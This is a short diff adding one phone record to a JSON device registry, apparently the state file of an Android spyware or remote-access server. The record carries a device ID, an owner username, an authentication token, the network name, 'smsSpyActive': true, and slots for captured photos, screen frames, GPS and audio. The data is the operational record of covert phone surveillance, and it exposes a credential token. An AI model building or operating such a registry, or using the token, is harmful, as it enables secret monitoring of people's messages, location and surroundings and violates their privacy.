@@ -113,5 +113,28 @@
     "smsSpyActive": true,
     "lastGps": null,
     "lastAudio": null
+  },
+  {
+    "deviceId": "9fece7a829929289",
+    "deviceName": "vivo 1902",
+    "ownerUsername": "abiv12",
+    "token": "e299efbd5586d4808ecd3c1b64ab2202",
+    "lastSeen": 1779037187677,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-17T16:59:47.677Z",
+    "deviceInfo": {
+      "model": "vivo vivo 1902",
+      "androidVersion": "Android 9",
+      "battery": 36,
+      "network": "WiFi: ZiF.Net",
+      "sim1": "Tidak ada",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "lastGps": null,
+    "lastAudio": null
   }
 ]
